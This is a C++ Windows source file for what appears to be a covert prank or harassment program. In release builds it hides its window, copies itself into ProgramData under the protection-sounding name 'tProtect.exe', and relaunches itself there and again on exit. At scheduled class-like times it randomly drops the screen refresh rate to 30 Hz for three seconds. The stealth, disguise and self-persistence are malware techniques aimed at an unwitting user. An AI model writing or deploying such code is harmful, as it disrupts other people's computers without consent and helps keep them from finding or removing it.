#ifdef NDEBUG
    #pragma comment( linker, "/subsystem:\"windows\" /entry:\"mainCRTStartup\"" )
#endif

#include <iostream>
#include <Windows.h>
#include <chrono>
#include <thread>
#include <random>
#include <comdef.h>

#include "FlushRate.h"
#include "Time_A.h"
#include "BitchApp.h"
#include "SelfAlive.h"
#include "Process.h"

using namespace std;

#pragma region constants
int DISPLAYFREQUENCY_O;
bool INITIALIZED = false;
string aliveFolder = "C:\\ProgramData\\tProtect";
string aliveName = "tProtect.exe";
string schedule[] = {
    "1-8:15",
    "1-9:20",
    "2-12:45",
    "2-13:55",
    "3-10:20",
    "3-14:45",
    "4-8:05",
    "5-13:45"
};
#pragma endregion

int main()
{

#ifdef _DEBUG
    cout << "初始化中..." << endl;
#endif
#ifdef NDEBUG
    atexit(last);
#endif
    if (!INITIALIZED) {
        //保活
        if (getWorkingPath().compare(aliveFolder) != 0) {
#ifdef NDEBUG
            copySelfToDirectory();
            selfStart();
            return 0;
#endif
        }

        DEVMODE devModeA;
        devModeA.dmSize = sizeof(devModeA);
        EnumDisplaySettings(0, ENUM_CURRENT_SETTINGS, &devModeA);
        DISPLAYFREQUENCY_O = devModeA.dmDisplayFrequency;
        INITIALIZED = true;
    }

#ifdef _DEBUG
    cout << "初始化完成，开始执行" << endl;
#endif
#ifdef NDEBUG
    //秒数归零
    int currentSecond = getCurrentSecond();
    this_thread::sleep_for(chrono::seconds(60 - currentSecond));

    while (true) {
        string timeT = getFormatedTime();
        for (const auto& s : schedule) {
            if (timeT.compare(s)==0) {
                apply();
            }
        }
        this_thread::sleep_for(chrono::minutes(1));
    }
#endif
#ifdef _DEBUG
    cout << isRemovableDevice() << endl;
    //copySelfToDirectory();
    cout << getWorkingPath() << endl;
    Sleep(50000);
#endif
}

void apply() {
    std::mt19937 rng(std::random_device{}());
    if (rng() % 2 == 0) {
        changeFlushRateA(30);
        this_thread::sleep_for(chrono::seconds(3));
        changeFlushRateA(DISPLAYFREQUENCY_O);
    }
}
#ifdef NDEBUG
void last() {
    if (getWorkingPath().compare(aliveFolder) != 0) {
        string Path = aliveFolder + "\\" + aliveName;
        startProcess(Path);
    }
}
#endif